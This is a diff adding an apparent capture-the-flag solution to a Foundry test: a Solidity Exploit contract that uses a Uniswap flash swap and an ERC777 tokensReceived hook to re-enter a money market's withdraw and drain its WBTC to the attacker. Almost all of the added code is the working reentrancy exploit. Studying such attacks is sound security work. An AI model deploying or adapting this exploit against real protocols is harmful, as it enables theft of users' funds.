@@ -119,6 +119,8 @@ contract Testing is Test {
         vm.startPrank(attacker,attacker);
 
         // implement solution here
+        Exploit exploit = new Exploit(address(wbtc),address(moneyMarket),address(usdcBtcPair));
+        exploit.pwn();
 
         vm.stopPrank();
         validation();
@@ -133,4 +135,63 @@ contract Testing is Test {
 
     }
 
+}
+
+contract Exploit{
+    
+    address owner;
+    IUniswapV2Pair usdcBtcPair;
+    IWETH weth;
+    Token usdc;
+    Token777 wbtc;
+    IMoneyMarket moneyMarket;
+
+    IERC1820Registry internal constant _ERC1820_REGISTRY = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
+    bytes32 private constant _TOKENS_RECIPIENT_INTERFACE_HASH = keccak256("ERC777TokensRecipient");
+
+
+    constructor(address _wbtc, address _moneyMarket, address _usdcBtcPair ){
+        owner = msg.sender;
+        wbtc = Token777(_wbtc);
+        moneyMarket = IMoneyMarket(_moneyMarket);
+        usdcBtcPair = IUniswapV2Pair(_usdcBtcPair);
+        wbtc.approve(address(moneyMarket),type(uint).max);
+        wbtc.approve(address(usdcBtcPair),type(uint).max);
+        _ERC1820_REGISTRY.setInterfaceImplementer(address(this), _TOKENS_RECIPIENT_INTERFACE_HASH, address(this));
+    }
+
+    function uniswapV2Call(address _address,uint amount0Out,uint amount1Out, bytes memory data) external {
+        uint256 wbtcAmount = wbtc.balanceOf(address(this));
+        console.log("balance wbtc of exploit : ",wbtcAmount);
+        
+        moneyMarket.supply(address(wbtc),amount1Out);
+
+        moneyMarket.withdraw(address(wbtc),amount1Out);
+        
+
+        
+        console.log("balance wbtc of exploit : ",wbtc.balanceOf(address(this)));
+        console.log("amount to repay : ",(amount1Out * 103 /100)+1);//yeah the premium is a bit to high
+
+        wbtc.transfer(address(usdcBtcPair), (amount1Out * 103 /100)+1);
+        wbtc.transfer(owner, wbtc.balanceOf(address(this)));
+        console.log("balance wbtc of attacker : ",wbtc.balanceOf(address(owner)));
+    }
+
+    function tokensReceived(
+        address operator,
+        address from,
+        address to,
+        uint256 amount,
+        bytes calldata userData,
+        bytes calldata operatorData
+    ) external{
+        if(wbtc.balanceOf(address(moneyMarket)) >= 1e18 ) {
+            console.log("balance wbtc of attacker : ",wbtc.balanceOf(address(owner)));
+            moneyMarket.withdraw(address(wbtc),amount);
+        }
+    }
+    function pwn() external {
+        usdcBtcPair.swap(0,10e18,address(this), new bytes(1));
+    }
 }
